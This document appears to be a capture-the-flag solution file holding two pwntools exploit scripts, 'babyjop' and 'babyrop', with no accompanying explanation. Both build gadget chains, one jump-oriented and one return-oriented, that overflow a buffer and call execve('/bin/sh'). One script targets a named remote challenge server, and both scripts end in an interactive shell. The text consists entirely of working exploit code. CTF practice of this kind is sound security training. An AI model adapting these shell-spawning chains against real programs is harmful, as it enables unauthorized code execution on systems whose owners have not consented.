# BABYJOP

```py
from pwn import *

elf = ELF('./babyjop')

r = remote(hostname, port)

r.sendlineafter('age: ', str(elf.sym['content'] + 0x18))

# jopchain
pld = b"/bin/sh\x00"
pld = pld.ljust(0xf, b'A')

# rsi + 0xf
pld += p64(0x000000000045862a) # push rdx; mov edi, edx; jmp qword ptr [rsi + 0x48]; 
pld = pld.ljust(0x18)

# final ropchain
pld += p64(0x0000000000451f27) # pop rax; ret;
pld += p64(0x3b)
pld += p64(0x00000000004018ca) # pop rdi; ret;
pld += p64(elf.sym['content'])
pld += p64(0x000000000048436b) # pop rdx; pop rbx; ret;
pld += p64(0x0)

# rsi + 0x48
pld += p64(0x00000000004031b0) # pop rsp; ret; 

pld += p64(0x000000000040f4fe) # pop rsi; ret;
pld += p64(0x0)
pld += p64(0x00000000004012d3) # syscall;

pld = pld.ljust(0x80, b'A')
pld += p32(0x000000000045a917) # xchg edx, edi; jmp qword ptr [rsi + 0xf];

r.sendafter('name: ', pld)

r.interactive()
```
# BABYROP

```py
from pwn import *

binary = context.binary = ELF('./babyrop')
#p = process(binary.path)
#gdb.attach(p)

p = remote('remote1.thcon.party', 10900)

rop = ROP([binary])
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
pop_rsi_r15 = rop.find_gadget(['pop rsi','pop r15','ret'])[0]

payload  = 0x28 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.search(b'/bin/sh').__next__())
payload += p64(pop_rsi_r15)
payload += p64(0)
payload += p64(0)
payload += p64(binary.plt.execve)

p.sendline(payload)

p.interactive()
```


